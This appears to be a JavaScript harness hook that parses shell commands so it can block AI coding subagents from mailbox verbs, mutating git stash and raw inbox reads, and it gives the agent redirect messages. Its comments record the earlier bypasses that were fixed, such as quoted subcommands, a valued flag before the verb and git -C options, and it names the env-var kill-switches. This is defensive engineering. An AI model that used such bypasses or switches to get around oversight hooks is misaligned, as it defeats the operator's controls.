// are simply absent, same as any other unmatched context), but its blocking
// behavior for Codex subagents specifically has not been demonstrated.
//
// FLAG_SKIP_SRC allows an optional non-flag VALUE after each flag (Wave R3
// P2 fix, Reviewer 1: the prior `(?:-\S+\s+)*` skipped only bare flags, so a
// valued flag BEFORE the verb — `--session X inbox ack Y` — broke the match
// entirely at "X" and silently bypassed the guard; this consumes the
// optional value too).
const FLAG_SKIP_SRC = '(?:-\\S+(?:\\s+[^-\\s]\\S*)?\\s+)*';
const DEVSWARM_JS_PREFIX_SRC = '(?:node\\s+)?(?:\\S*[\\\\/])?scripts[\\\\/]devswarm\\.js';

// register/archive (Wave R3 P2, R4 Critic): both advance cursors through
// foldGroupIntoSurvivor (scripts/devswarm.js ~2654, invoked from
// retireWorktreeDuplicates ~2562 and retireArchivedWorktreeGroup ~3350) — a
// subagent never legitimately registers or archives a workspace, that is a
// main-thread/coordinator lifecycle action. Negative lookahead `(?!-)`
// excludes the SEPARATE, allowed lifecycle verbs `register-primary` and
// `archive-request`/`archive-ignore`/`archive-unignore`/`unarchive` (the
// leading `\b` this alternation is embedded under already excludes
// `unarchive`'s mid-word "archive" substring — no boundary exists between
// "un" and "archive").
const MAILBOX_VERB_ALT = '(?:inbox\\s+' + FLAG_SKIP_SRC
  + '(?:pull|ack|read-primary|drain-primary-legacy|read|tick)\\b|heartbeat\\b|reap-orphans\\b|register(?!-)\\b|archive(?!-)\\b)';
const DEVSWARM_JS_MAILBOX_RE = new RegExp(
  '\\b' + DEVSWARM_JS_PREFIX_SRC + '\\s+' + FLAG_SKIP_SRC + MAILBOX_VERB_ALT,
  'i'
);

// inbox messages + --ack/--ack-as-owner: TWO-PART detection (base-verb match
// AND a flag scan across the whole segment) because the flag can legally
// appear before OR after the target id / other flags.
const DEVSWARM_JS_INBOX_MESSAGES_RE = new RegExp(
  '\\b' + DEVSWARM_JS_PREFIX_SRC + '\\s+' + FLAG_SKIP_SRC + 'inbox\\s+' + FLAG_SKIP_SRC + 'messages\\b',
  'i'
);
const ACK_FLAG_RE = /--ack-as-owner\b|--ack\b/i;

// mesh read WITHOUT --peek/--seq. Two-part for the same reason as above.
const DEVSWARM_JS_MESH_READ_RE = new RegExp(
  '\\b' + DEVSWARM_JS_PREFIX_SRC + '\\s+' + FLAG_SKIP_SRC + 'mesh\\s+' + FLAG_SKIP_SRC + 'read\\b',
  'i'
);
const MESH_READ_SAFE_FLAG_RE = /--peek\b|--seq\b/i;

// roster --ack (mesh-read alias, D23). Two-part: base verb + flag scan.
const DEVSWARM_JS_ROSTER_RE = new RegExp(
  '\\b' + DEVSWARM_JS_PREFIX_SRC + '\\s+' + FLAG_SKIP_SRC + 'roster\\b',
  'i'
);
const ROSTER_ACK_FLAG_RE = /--ack\b/i;

function mailboxTouchInSegment(dequoted) {
  if (DEVSWARM_JS_MAILBOX_RE.test(dequoted)) return true;
  if (DEVSWARM_JS_INBOX_MESSAGES_RE.test(dequoted) && ACK_FLAG_RE.test(dequoted)) return true;
  if (DEVSWARM_JS_MESH_READ_RE.test(dequoted) && !MESH_READ_SAFE_FLAG_RE.test(dequoted)) return true;
  if (DEVSWARM_JS_ROSTER_RE.test(dequoted) && ROSTER_ACK_FLAG_RE.test(dequoted)) return true;
  return false;
}

function detectSubagentMailboxTouch(command, depth) {
  if (typeof command !== 'string' || !command.trim()) return false;
  const d = typeof depth === 'number' ? depth : 0;
  for (const seg of splitSegments(command)) {
    const dequoted = dequoteSegment(seg);
    if (mailboxTouchInSegment(dequoted)) return true;
    if (d < 3) {
      const payload = extractShellCPayload(seg);
      if (payload && detectSubagentMailboxTouch(payload, d + 1)) return true;
      const evalPayload = extractEvalPayload(seg);
      if (evalPayload && detectSubagentMailboxTouch(evalPayload, d + 1)) return true;
    }
  }
  if (d < 3) {
    for (const inner of extractSubstitutions(command)) {
      if (detectSubagentMailboxTouch(inner, d + 1)) return true;
    }
  }
  return false;
}
function buildSubagentMailboxReason() {
  return bm().blockMessage({
    guard: 'devswarm-mailbox',
    what: 'a DevSwarm mailbox verb (inbox pull/ack/ack-primary/read/read-primary/drain-primary-legacy/tick, inbox messages --ack, mesh read, roster --ack, reap-orphans, register, archive, heartbeat) is blocked in a subagent.',
    why: 'A subagent that acks or reads advances the shared cursor, so the main thread silently misses mail (defect f0958b13fe2b).',
    instead: 'report what you learned to your parent; the main thread drains the mailbox itself. Never delegate mailbox verbs.',
    allowed: '`inbox count`, `inbox peek-primary`, `mesh read --peek`, plain `roster`.',
    override: 'set ANTIHALL_ALLOW_SUBAGENT_MAILBOX=1 to disable this guard entirely',
  });
}

// git-stash-guard (defect b08b26566b92): mutating `git stash` detection —
// mirrors detectSubagentMailboxTouch's own segment/shell-c/eval/substitution
// recursion above so a wrapped invocation (`bash -c "git stash"`, `$(...)`,
// a `&&`/`;`/`|` chain) is caught the same way that guard already is.
// `git stash list`/`show`/`branch` are read-only or non-destructive-enough to
// be OUT of this defect's stated scope and are never matched. A BARE
// `git stash` (no subcommand) is git's own shorthand for `git stash push` —
// treated identically.
//
// R2 Critic P1 fixes (3 bypasses in the original adjacency-regex version):
//   1. `git stash -u|--include-untracked|-k|--keep-index|-m X|-p|-q|-a` are
//      ALL flag-only forms of `push` per git-stash(1) — the old regex only
//      captured the token immediately after `stash` and treated anything
//      that wasn't a KNOWN subcommand word as "no match", so a flag-only
//      invocation slipped through unclassified. Now: after the `stash` token,
//      leading flags are walked (STASH_PUSH_ONLY_FLAGS) until either a real
//      subcommand word is found or the tokens run out (-> push).
//   2. `git -C <path> stash` / `git --git-dir=X stash` bypassed the old
//      `\bgit\s+stash\b` adjacency regex (git's own global options sit
//      between `git` and `stash`). Now: `git`'s token is located explicitly,
//      then GIT_GLOBAL_OPTS_TAKE_VALUE/`--opt=value` are walked past to find
//      the actual subcommand, mirroring the git-argv contract instead of
//      assuming zero-distance adjacency.
//   3. `grep -rn "git stash drop" docs/` and `git commit -m "...git stash
//      pop..."` used to false-positive: `dequoteSegment` (which this used to
//      run against) FLATTENS quote boundaries, so a quoted commit message
//      containing the literal text "git stash pop" became indistinguishable
//      from a real invocation. Fixed at the root: this now runs against the
//      RAW segment via `effectiveVerb` (must resolve to `git`, so `grep ...`
//      never even enters git-argv parsing) and `tokenizeQuoted` (which keeps
//      a quoted phrase as ONE token, so a `-m "...git stash pop..."` value
//      is never split back into bare `git`/`stash`/`pop` words).
const GIT_GLOBAL_OPTS_TAKE_VALUE = new Set(['-C', '-c', '--git-dir', '--work-tree', '--namespace', '--exec-path']);
const STASH_PUSH_FLAG_VALUE = new Set(['-m', '--message']);
function mutatingGitStashInSegment(seg) {
  if (effectiveVerb(seg) !== 'git') return null;
  const tokens = tokenizeQuoted(seg);
  let idx = 0;
  while (idx < tokens.length && basename(tokens[idx]).toLowerCase() !== 'git') idx++;
  if (idx >= tokens.length) return null;
  idx++; // skip the `git` token itself
  // Walk git's own GLOBAL options (before the subcommand) — `-C <path>`,
  // `--git-dir[=path]`, `-c <key>=<val>`, flag-only globals (`--no-pager`,
  // `--bare`, ...). Any unrecognized `-`-prefixed token is consumed as a
  // single (flag-only) token — a global option this file does not know about
  // can only cause a FALSE NEGATIVE here (miss a stash call), never a false
  // positive, which is the safe failure direction for a blocking guard.
  while (idx < tokens.length) {
    const tok = tokens[idx];
    if (tok === '--') { idx++; break; }
    if (!tok.startsWith('-')) break;
    if (/^--[A-Za-z-]+=/.test(tok)) { idx++; continue; }
    if (GIT_GLOBAL_OPTS_TAKE_VALUE.has(tok)) {
      idx++;
      if (idx < tokens.length) idx++;
      continue;
    }
    idx++;
  }
  if (idx >= tokens.length || tokens[idx].toLowerCase() !== 'stash') return null;
  idx++; // skip the `stash` token itself
  // Walk `stash`'s own flags. A flag-only form (no subcommand word at all)
  // is git's own `push` shorthand — see STASH_PUSH_FLAG_VALUE / the header
  // comment's item 1.
  while (idx < tokens.length) {
    const tok = tokens[idx];
    if (!tok.startsWith('-')) break;
    if (/^--message=/.test(tok)) { idx++; continue; }
    if (STASH_PUSH_FLAG_VALUE.has(tok)) {
      idx++;
      if (idx < tokens.length) idx++;
      continue;
    }
    idx++;
  }
  if (idx >= tokens.length) return 'push';
  const sub = tokens[idx].toLowerCase();
  if (sub === 'list' || sub === 'show' || sub === 'branch') return null;
  if (sub === 'push' || sub === 'pop' || sub === 'drop' || sub === 'clear' || sub === 'apply' || sub === 'save') {
    return sub;
  }
  return null;
}
function detectMutatingGitStash(command, depth) {
  if (typeof command !== 'string' || !command.trim()) return null;
  const d = typeof depth === 'number' ? depth : 0;
  for (const seg of splitSegments(command)) {
    const hit = mutatingGitStashInSegment(seg);
    if (hit) return hit;
    if (d < 3) {
      const shellCPayload = extractShellCPayload(seg);
      if (shellCPayload) {
        const r = detectMutatingGitStash(shellCPayload, d + 1);
        if (r) return r;
      }
      const evalPayload = extractEvalPayload(seg);
      if (evalPayload) {
        const r = detectMutatingGitStash(evalPayload, d + 1);
        if (r) return r;
      }
    }
  }
  if (d < 3) {
    for (const inner of extractSubstitutions(command)) {
      const r = detectMutatingGitStash(inner, d + 1);
      if (r) return r;
    }
  }
  return null;
}
// findGitToplevelForStashGuard used to live here as its own PURE fs walk-up
// (no git spawn) — Phase 2 mesh redesign, B3: retired in favor of the one
// canonical resolver (companion/lib/identity.js's resolveContext), which is
// the same zero-spawn-first walk. `ctx.toplevel`, not `worktreeRoot`, is the
// right field here: a stash acts on the nearest repo actually checked out at
// cwd (a submodule included), not its superproject.
// hasProtectedStashesMarker(cwd) -> bool. The repo opts INTO stash protection
// by creating `.anti-hall/protected-stashes` at its git toplevel (any
// content, existence-only check) — this marker (or the ANTIHALL_STASH_GUARD=1
// env opt-in, see the call site) is how a repo/operator ARMS the guard; a
// repo that has never heard of it stays fully unaffected (R2 Critic P1 —
// "no unconditional default block in a public plugin").
function hasProtectedStashesMarker(cwd) {
  try {
    const top = require('../companion/lib/identity.js').resolveContext(cwd || process.cwd(), { missingPath: 'ancestor' }).toplevel;
    if (!top) return false;
    fs.statSync(path.join(top, '.anti-hall', 'protected-stashes'));
    return true;
  } catch (_) {
    return false;
  }
}
const bm = () => require('./lib/block-message.js');
// buildGitStashReason(sub, subagent) -> closed-vocabulary block reason (NEVER
// reflects command/stdin text). `sub` is drawn from a fixed, code-defined set
// (see mutatingGitStashInSegment), never raw input.
function buildGitStashReason(sub, subagent) {
  const scope = subagent
    ? 'a subagent (workers must never touch the coordinator\'s working tree via stash)'
    : 'this repo (guard armed: .anti-hall/protected-stashes exists or ANTIHALL_STASH_GUARD=1)';
  return bm().blockMessage({
    guard: 'git-stash-guard',
    what: '`git stash ' + sub + '` is blocked for ' + scope + '.',
    why: 'A stash can swallow another agent\'s protected WIP (defect b08b26566b92).',
    instead: 'commit the work (even as a WIP commit); never delegate a stash to a subagent.',
    allowed: '`git stash list` (read-only).',
  });
}

// buildDevswarmSendReason(kind) -> closed-vocabulary block reason (NEVER reflects
// command/stdin text — injection hygiene). Redirects to the mesh CLI verbs from
// PLAN.md's CLI VERB CONTRACT: `send --to-primary|--to <meshId>` to direct-
// message, `heartbeat <id> --summary "<text>"` to report status.
function buildDevswarmSendReason(kind) {
  return bm().blockMessage({
    guard: 'devswarm-mesh-only',
    what: '`hivecontrol workspace ' + kind + '` is blocked.',
    why: 'anti-hall\'s shared mesh store is the only agent-initiated messaging transport; a delegated send writes the native queue identically.',
    instead: '`node scripts/devswarm.js send --to-primary --message-file <path>` (or `--to <meshId>`) to message, `node scripts/devswarm.js heartbeat <id> --summary "<text>"` to report status.',
    override: 'set DISABLE_ANTIHALL_DEVSWARM=1 to disable this guard entirely',
  });
}

// File-read verbs whose path ARGUMENTS must be classified against the DevSwarm
// inbox/store taxonomy. cat/head/tail/less/more/od/xxd/strings/nl take file args
// directly; grep/sed/awk take a file arg after their pattern/script.
const FILE_READ_VERBS = new Set([
  'cat', 'head', 'tail', 'less', 'more', 'od', 'xxd', 'strings', 'nl',
  'grep', 'sed', 'awk',
]);

// Verbs whose FIRST non-flag operand is a PATTERN/script, not a path — it must
// never be classified as a file argument even when it is quoted and its text
// happens to look like (or literally BE) a real path. Only operands AFTER the
// pattern/script are candidate file paths for these verbs. cat/head/tail/etc.
// are NOT in this set — every one of their non-flag operands is a path.
const PATTERN_FIRST_VERBS = new Set(['grep', 'sed', 'awk']);

// tokenizeQuoted()/dequoteSegment() are imported from ./lib/shell-scan.js
// (shared with git-guard.js). dequoteSegment(segment) is the SHELL-EFFECTIVE
// argv text: quote delimiters stripped, quoted/unquoted fragments WITHIN one
// token concatenated (via tokenizeQuoted), tokens rejoined with single
// spaces. Models what the shell actually passes as argv — quoting a bareword
// does NOT change argv, the shell executes it identically — so
// `"hivecontrol"`, `'message-parent'`, and `mes"sage-par"ent` all dequote to
// the same literal text as their unquoted form (`hivecontrol`,
// `message-parent`). Used (instead of neutralizeQuotedContents, which BLANKS
// quoted content and was the source of a live-verified P0 bypass — quoting a
// subcommand or the verb made the hivectl guards below miss it entirely) so
// verb-anchoring and subcommand matching run against the same text the shell
// would. Quoted DATA passed to an unrelated verb stays safe: `grep -n
// "hivecontrol workspace message-parent" f` dequotes to `grep -n hivecontrol
// workspace message-parent f`, but the verb-anchoring check below still reads
// the FIRST token as `grep`, not `hivecontrol`, so it still ALLOWS. NOT a
// shell parser — no backslash-escape or parameter/command-substitution
// support, matching the existing best-effort tokenization used throughout
// this file. tokenizeQuoted is also used by detectProtectedFileRead below to
// recover a quoted path argument's real text.

// detectProtectedFileRead(command, home, cwd, depth) -> 'deny-inbox' | 'deny-store' | null.
// Parallels detectHivectlDestructiveRead: the SAME effectiveVerb command-position
// anchoring (computed on the RAW segment, as effectiveVerb always does), and the
// SAME recursion into bash -c / eval / $()/backtick payloads. For a read verb, its
// path args are recovered via tokenizeQuoted (quote delimiters stripped, content
// kept — so a bare, double-quoted, OR single-quoted path all yield the identical
// path string) and classified via the shared devswarm-inbox-paths module; the
// FIRST arg resolving to a deny path wins.
//   - This does NOT over-block quoted DATA: `echo "…/inbox/x"` never reaches here
//     because echo is not a read verb. For grep/sed/awk (PATTERN_FIRST_VERBS), the
//     first non-flag operand is the PATTERN/script and is SKIPPED — never
//     classified — regardless of quoting or content, so `grep 'inbox' docs/KB.md`
//     and even `grep '<the literal inbox path>' docs/KB.md` stay ALLOW; only a
//     trailing FILE operand (e.g. `grep pattern <realInboxPath>`) can classify deny.
// Fully fail-open: any throw / unavailable classifier -> null (never block).
function detectProtectedFileRead(command, home, cwd, depth) {
  if (typeof command !== 'string' || !command.trim()) return null;
  const d = typeof depth === 'number' ? depth : 0;
  let classify;
  try {
    classify = require('./lib/devswarm-inbox-paths.js').classifyDevswarmPath;
  } catch (_) {
    return null; // classifier unavailable -> fail-open
  }
  for (const seg of splitSegments(command)) {
    const verb = effectiveVerb(seg);
    if (verb && FILE_READ_VERBS.has(verb)) {
      const tokens = tokenizeQuoted(seg);
      let idx = 0;
      while (idx < tokens.length && basename(tokens[idx]).toLowerCase() !== verb) idx++;
      idx++; // skip the verb token itself
      // grep/sed/awk: the first non-flag operand is a PATTERN/script, not a path —
      // skip it once before classifying any further operands as files.
      let skipNextOperand = PATTERN_FIRST_VERBS.has(verb);
      for (; idx < tokens.length; idx++) {
        const tok = tokens[idx];
        if (!tok || tok.startsWith('-')) continue; // skip flags / empties
        if (skipNextOperand) { skipNextOperand = false; continue; }
        let v = 'allow';
        try { v = classify(tok, home, cwd); } catch (_) { v = 'allow'; }
        if (v === 'deny-inbox' || v === 'deny-store') return v;
      }
    }
    if (d < 3) {
      const payload = extractShellCPayload(seg);
      if (payload) {
        const inner = detectProtectedFileRead(payload, home, cwd, d + 1);
        if (inner) return inner;
      }
      const evalPayload = extractEvalPayload(seg);
      if (evalPayload) {
        const inner = detectProtectedFileRead(evalPayload, home, cwd, d + 1);
        if (inner) return inner;
      }
    }
  }
  if (d < 3) {
    for (const inner of extractSubstitutions(command)) {
      const r = detectProtectedFileRead(inner, home, cwd, d + 1);
      if (r) return r;
    }
  }
  return null;
}

// buildRawFileReadReason(kind) -> closed-vocabulary block reason for a raw shell
// read (cat/head/…) of the inbox/store. Uses the ACCURATE harm model (cursor
// desync + store-layering violation — NOT "drains the queue", which is false for
// the append-only inbox). NEVER echoes the path (injection hygiene).
function buildRawFileReadReason(kind) {
  const override = 'set DISABLE_ANTIHALL_DEVSWARM=1 to disable this guard entirely';
  if (kind === 'deny-store') {
    return bm().blockMessage({
      guard: 'devswarm-store-read',
      what: 'a shell read of the raw DevSwarm store (SQLite db, sidecars, journal NDJSON) is blocked.',
      why: 'The store is the write/derive layer; a raw read risks a partial view and a layering violation.',
      instead: '`devswarm.js inbox read <id>` (or `devswarm.js inbox pull <id>` first to import).',
      override,
    });
  }
  return bm().blockMessage({
    guard: 'devswarm-inbox-read',
    what: 'a shell read of the raw DevSwarm inbox file is blocked.',
    why: 'It does not drain the queue, but bypasses the durable cursor, so messages get re-processed or skipped.',
    instead: '`devswarm.js inbox pull <id>` then `devswarm.js inbox read <id>`.',
    override,
  });
}

// buildDevswarmReason(kind, env) -> closed-vocabulary block reason. NEVER reflects
// command/stdin text (injection hygiene). Names ANTIHALL_DEVSWARM_INBOX_CMD (the
// var, not its value) as the read path when configured; always includes the
// do-not-delegate line, the wrapper redirect (`devswarm.js inbox pull`/`read`), and
// the DISABLE_ANTIHALL_DEVSWARM=1 kill-switch; for read-messages, states that
// message-count reflects the NATIVE queue only (a 0 there does NOT mean no pending
// messages under a durable inbox). References no wrapper/CLI that does not exist.
function buildDevswarmReason(kind, env) {
  const e = env || process.env;
  let inboxCmd;
  try { inboxCmd = require('./lib/settings.js').getWithEnv('devswarm', 'inboxCmd', '', e); }
  catch (_) { inboxCmd = e.ANTIHALL_DEVSWARM_INBOX_CMD; }
  const hasInboxCmd = typeof inboxCmd === 'string' && inboxCmd.trim() !== '';
  const instead = (hasInboxCmd ? 'read via the configured ANTIHALL_DEVSWARM_INBOX_CMD, or ' : '') +
    '`devswarm.js inbox pull <id>` then `devswarm.js inbox read <id>` (durable cursor). Do not delegate this to a subagent either.';
  const override = 'set DISABLE_ANTIHALL_DEVSWARM=1 to disable the read-guard entirely';
  if (kind === 'monitor') {
    return bm().blockMessage({
      guard: 'devswarm-read-guard',
      what: '`hivecontrol workspace monitor` is blocked.',
      why: 'It is a long-poll with no default timeout: it hangs the shell until a message arrives and consumes the native queue.',
      instead,
      override,
    });
  }
  return bm().blockMessage({
    guard: 'devswarm-read-guard',
    what: '`hivecontrol workspace read-messages` is blocked.',
    why: 'It mark-reads and drains the native queue, losing messages the durable inbox still needs.',
    instead,
    allowed: '`message-count` reflects the NATIVE queue only; a 0 does not mean nothing is pending.',
    override,
  });
}

// Heredoc handling (opener kept, body skipped) fixes the confirmed root cause
// of P2 fp dd88d2a72562/b183a9f1bbd5: without heredoc awareness, a heredoc
// BODY's own newlines are ordinary segment-split points (see the `\n` case
// below), so a message body written as `devswarm.js send ... <<'EOF' ... EOF`
// gets each body LINE parsed as its own command segment. A body line that
// happens to START with a heavy word ("make progress on X") then has
// effectiveVerb === 'make' (a HEAVY_VERB) and is misclassified as an executed
// command, not prose. The fix: keep the heredoc OPENER text (e.g. `<<'EOF'`)
// in the invoking segment so that command's own verb is still classified
// normally, but SKIP the heredoc BODY entirely — it is DATA, never re-parsed
// as segments/commands. HEREDOC_RE/parseHeredocAt live in ./lib/shell-scan.js
// (shared with git-guard.js — see that file's SCOPE DISCIPLINE note for why
// only the low-level heredoc-construct parser is shared, not segmentation
// itself).

// Split a full command line into logical segments on the shell operators
// ; && || | (and newlines), honoring single/double quotes so an operator inside
// a quoted string does not create a spurious segment. Mirrors git-guard.js's
// splitter (kept self-contained — hooks are standalone scripts). This is what
// makes per-segment heuristics work: `cd app && npm test` is two segments, and
// `npm test` is correctly seen as heavy even though the FIRST verb is `cd`.
// splitSegmentsDetailed(cmd) -> { segments, delims }. Same single scan as
// splitSegments (below, now a thin wrapper around this) — NOT a second
// parser: it is the identical character-by-character walk, only additionally
// recording WHICH delimiter terminated each segment (delims[i] is what
// followed segments[i] — '|', '&&', '||', ';', '&', '\n', 'heredoc', 'group',
// 'subst', or 'end'). The narrow-allow bounded-verification check (below)
// needs this to tell a real `<check> | tail` PIPE from a merely-adjacent
// `<check> ; tail` sequence, which splitSegments' plain string array cannot
// distinguish. segments/delims stay 1:1 and in the same order splitSegments
// has always produced.
function splitSegmentsDetailed(cmd) {
  const segments = [];
  const delims = [];
  let cur = '';
  let i = 0;
  const n = cmd.length;
  let inSingle = false;
  let inDouble = false;
  // Shell-comment tracking. `nest` holds the open `(`/`{` (incl. `$(`, `$((`,
  // `${`) and `inTick` backtick state; `escEnd` is the index just past the
  // last backslash escape / line continuation (so `\ #` or `a\<nl>#` is
  // mid-word, not a comment).
  const nest = [];
  let inTick = false;
  let escEnd = -1;

  function flush(delim) {
    if (cur.trim().length) { segments.push(cur); delims.push(delim); }
    cur = '';
  }

  let heredoc = null; // the pending heredoc whose body starts after its opener line

  while (i < n) {
    if (heredoc && i >= heredoc.lineEnd) {
      // End of the opener line: the heredoc closes the logical command.
      flush('heredoc');
      i = Math.max(i, heredoc.end);
      heredoc = null;
      inSingle = false;
      inDouble = false;
      continue;
    }
    const c = cmd[i];
    const c2 = i + 1 < n ? cmd[i + 1] : '';

    if (inSingle) { cur += c; if (c === "'") inSingle = false; i++; continue; }
    if (inDouble) {
      if (c === '\\' && c2) { cur += c + c2; i += 2; continue; }
      cur += c; if (c === '"') inDouble = false; i++; continue;
    }
    // ANSI-C `$'…'`: unlike plain '…', a backslash escapes the next char, so
    // `\'` does NOT close it. Reading it as plain '…' closed early at `\'`
    // and re-opened at the real closer, hiding `; go build` inside a fake
    // quoted span (`$'a\' # '; go build`).
    if (c === '$' && c2 === "'") {
      let j = i + 2;
      while (j < n && cmd[j] !== "'") j += cmd[j] === '\\' ? 2 : 1;
      j = Math.min(j + 1, n);
      cur += cmd.slice(i, j); i = j; continue;
    }
    if (c === "'") { inSingle = true; cur += c; i++; continue; }
    if (c === '"') { inDouble = true; cur += c; i++; continue; }

    // Line continuation: backslash-newline joins lines.
    if (c === '\\' && (c2 === '\n' || (c2 === '\r' && cmd[i + 2] === '\n'))) {
      cur += ' '; i += (c2 === '\r') ? 3 : 2; escEnd = i; continue;
    }
    // Outside quotes a backslash escapes the NEXT character: `\"`/`\'` are
    // literal quote chars (no quote state change) and `\;`/`\|`/`\&` are
    // literal, not operators — exactly as bash reads them. Without this,
    // `git commit -m \" ; npm test ; echo \"` looked like ONE quoted arg to
    // the splitter while bash runs `npm test` as its own command.
    if (c === '\\' && c2) { cur += c + c2; i += 2; escEnd = i; continue; }

    // Shell comment: an unquoted `#` that STARTS A WORD (start of input, or
    // right after unescaped whitespace or `;` `&` `|`) runs to the next newline
    // and is never executed — drop it so its text (`# 1) go to x`) is not
    // split into bogus segments. Recognized ONLY at nesting depth 0 and outside
    // backticks: inside `${x:- #}`, `(( 2 #))` and backticks bash does NOT
    // treat `#` as a comment past the closer (verified), so stripping there
    // could hide a real command; staying literal is the strict fallback. `)`
    // is deliberately not a word start (`$(echo a)#b` is the word `a#b`).
    // Mid-word `#` (`a#b`, `$#`, `${#x}`, `x=#`) stays code. The newline that
    // ends the comment is left for the normal `\n` split below.
    if (c === '#' && !nest.length && !inTick && escEnd !== i &&
        (i === 0 || /[ \t\n;&|]/.test(cmd[i - 1]))) {
      const nl = cmd.indexOf('\n', i);
      i = nl === -1 ? n : nl;
      continue;
    }

    // Heredoc: the operator word stays on the current segment and the rest of
    // the opener line is split as usual (`cat <<EOF | git commit -F -` is two
    // segments); at that line's newline the BODY (up to and including the
    // terminator line) is skipped without emitting segments. A second `<<` on
    // the same line is left as text (its body is not skipped: stricter).
    if (c === '<' && c2 === '<' && !heredoc) {
      const parsed = parseHeredocAt(cmd, i);
      if (parsed) {
        cur += cmd.slice(i, parsed.openerEnd);
        i = parsed.openerEnd;
        if (parsed.lineEnd !== undefined) heredoc = parsed;
        continue;
      }
    }

    if (c === '&' && c2 === '&') { flush('&&'); i += 2; continue; }
    if (c === '|' && c2 === '|') { flush('||'); i += 2; continue; }
    if (c === '|') { flush('|'); i++; continue; }
    if (c === ';') { flush(';'); i++; continue; }
    // A redirection `&` is NOT a background separator: fd-dup `2>&1` / `>&2` /
    // `<&3` (unescaped `>`/`<` right before) and `&>file` / `&>>file`. Treating
    // it as `&` split `x 2>&1 | tail` into `x 2>` / `1 | tail`, losing the pipe.
    // `escEnd !== i` keeps `\>&` (literal `>` then a real `&`) a separator.
    if (c === '&' && ((escEnd !== i && (cmd[i - 1] === '>' || cmd[i - 1] === '<')) || c2 === '>')) {
      cur += c; i++; continue;
    }
    if (c === '&') { flush('&'); i++; continue; }
    if (c === '\n') { flush('\n'); i++; continue; }
    // Subshell / grouping / command-substitution boundaries -> segment splits.
    if (c === ')' || c === '(' || c === '{' || c === '}') {
      if (c === '(' || c === '{') nest.push(c);
      else if (nest.length && nest[nest.length - 1] === (c === ')' ? '(' : '{')) nest.pop();
      flush('group'); i++; continue;
    }
    if (c === '$' && c2 === '(') { nest.push('('); flush('subst'); i += 2; continue; }
    if (c === '`') { inTick = !inTick; flush('subst'); i++; continue; }
    // `$[ … ]` (legacy arithmetic) is a nesting context too: a `#` inside it
    // is not a comment, so it must not be stripped as one.
    if (c === '$' && c2 === '[') { nest.push('['); cur += '$['; i += 2; continue; }
    if (c === '[' && nest.length && nest[nest.length - 1] === '[') nest.push('[');
    else if (c === ']' && nest.length && nest[nest.length - 1] === '[') nest.pop();

    cur += c;
    i++;
  }
  flush('end');
  return { segments, delims };
}

// Split a full command line into logical segments on the shell operators
// ; && || | (and newlines), honoring single/double quotes so an operator inside
// a quoted string does not create a spurious segment. Mirrors git-guard.js's
// splitter (kept self-contained — hooks are standalone scripts). This is what
// makes per-segment heuristics work: `cd app && npm test` is two segments, and
// `npm test` is correctly seen as heavy even though the FIRST verb is `cd`.
function splitSegments(cmd) {
  return splitSegmentsDetailed(cmd).segments;
}

// basename() is imported from ./lib/shell-scan.js (shared with git-guard.js).

// Wrapper words to skip when finding a segment's effective verb (mirrors
// git-guard.js WRAPPERS, plus the shell control keywords that can lead a segment).
const WRAPPERS = new Set([
  'command', 'builtin', 'exec', 'sudo', 'env', 'nice', 'nohup', 'time', 'timeout',
  'taskpolicy', 'xargs',
  'then', 'do', 'else', 'if', 'while', 'until', '!',
]);

// Find the effective command verb of one segment: skip leading VAR=value
// assignment prefixes and wrapper words (command/builtin/exec/sudo/env/...).
// Returns the lowercased cross-platform basename of the verb, or '' if none.
function effectiveVerb(segment) {
  const tokens = segment.trim().split(/\s+/).filter(Boolean);
  let idx = 0;
  // Skip leading VAR=value assignments (FOO=1 docker build .).
  while (idx < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[idx])) idx++;
  // Skip wrapper words; for env/timeout/nice, skip their leading operands too so
  // the wrapped verb is found (e.g. `timeout 5 npm test` -> npm).
  while (idx < tokens.length) {
    const word = basename(tokens[idx]).toLowerCase();
    if (!WRAPPERS.has(word)) break;
    idx++;
    if (word === 'sudo') {
      // sudo [-flags [value]] command...   Skip option flags so
      // `sudo -u deploy npm install` resolves to `npm`, not `-u`.
      const SUDO_VAL = new Set(['-u', '-g', '-p', '-C', '-r', '-t', '-U', '-h',
        '--user', '--group', '--prompt', '--close-from', '--role', '--type',
        '--other-user', '--host']);
      while (idx < tokens.length && tokens[idx].startsWith('-')) {
        const f = tokens[idx]; idx++;
        if (f === '--') break;
        if (SUDO_VAL.has(f) && idx < tokens.length && !tokens[idx].startsWith('-')) idx++;
      }
    } else if (word === 'env') {
      while (idx < tokens.length &&
             (/^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[idx]) || tokens[idx].startsWith('-'))) idx++;
    } else if (word === 'timeout') {
      while (idx < tokens.length && tokens[idx].startsWith('-')) {
        const f = tokens[idx]; idx++;
        if ((f === '-s' || f === '--signal' || f === '-k' || f === '--kill-after') &&
            idx < tokens.length && !tokens[idx].startsWith('-')) idx++;
      }
      if (idx < tokens.length) idx++; // DURATION operand
    } else if (word === 'nice') {
      while (idx < tokens.length && tokens[idx].startsWith('-')) {
        const f = tokens[idx]; idx++;
        if ((f === '-n' || f === '--adjustment') &&
            idx < tokens.length && !tokens[idx].startsWith('-')) idx++;
      }
    } else if (word === 'taskpolicy') {
      // taskpolicy [-c class] [-b|-B] [-t class] [-p pid] ... command. Skip
      // option flags, consuming a separated value for -c/-t (the class arg).
      while (idx < tokens.length && tokens[idx].startsWith('-')) {
        const f = tokens[idx]; idx++;
        if ((f === '-c' || f === '-t' || f === '-p') &&
            idx < tokens.length && !tokens[idx].startsWith('-')) idx++;
      }
    } else if (word === 'xargs') {
      // xargs [-n N] [-I repl] [-P N] ... command. Best-effort: skip leading
      // flag tokens so the wrapped runner (e.g. `xargs pytest`) is found.
      while (idx < tokens.length && tokens[idx].startsWith('-')) idx++;
    }
  }
  if (idx >= tokens.length) return '';
  // Strip Windows/Unix path separators on the verb (/usr/bin/npm, \git -> npm/git).
  return basename(tokens[idx]).toLowerCase();
}

// Neutralize the CONTENTS of single- and double-quoted string literals in a
// segment, replacing each quoted char with a space so a HEAVY_PATTERN cannot
// match text that is merely a quoted DATA argument (e.g. `echo "npm run build"`).
// The quote delimiters themselves are also turned into spaces; unquoted text is
// left intact so a real unquoted `npm run build` still matches. This is used FOR
// THE PATTERN TEST ONLY — the effective-verb check and the $(...)/backtick/`-c`/
// `eval` extraction all run against the ORIGINAL segment, so command
// substitutions and shell payloads are still extracted and recursed BEFORE this
// neutralization can affect anything (extraction order preserved).
function neutralizeQuotedContents(segment) {
  let out = '';
  let i = 0;
  const n = segment.length;
